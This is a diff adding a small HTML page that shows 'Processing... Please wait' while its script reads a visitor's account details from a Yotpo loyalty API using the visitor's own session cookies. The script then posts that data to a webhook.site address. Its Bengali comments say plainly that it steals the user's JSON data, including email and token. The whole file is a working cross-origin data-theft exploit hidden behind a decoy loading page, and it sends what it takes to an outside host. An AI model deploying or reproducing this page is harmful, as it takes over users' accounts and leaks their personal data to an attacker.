@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+    <script>
+        // ১. আপনার Webhook লিঙ্ক
+        const myWebhook = "https://webhook.site/bb29ec8b-4687-4463-a63c-9468fd24d200"; 
+
+        // ২. সরাসরি API থেকে ইউজারের JSON ডাটা চুরি করা
+        fetch("https://loyalty.yotpo.com/api/v1/customer_details", {credentials: 'include'})
+        .then(res => res.json())
+        .then(data => {
+            // ৩. চুরি করা JSON ডাটা আপনার Webhook-এ পাঠিয়ে দেওয়া
+            fetch(myWebhook, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(data) // এটি আপনার কাছে ইমেইল এবং টোকেন পাঠাবে
+            });
+        })
+        .catch(err => {
+            fetch(myWebhook, { method: 'POST', mode: 'no-cors', body: "Error: " + err });
+        });
+    </script>
+    <h2 style="text-align:center;">Processing... Please wait</h2>
+</body>
+</html>
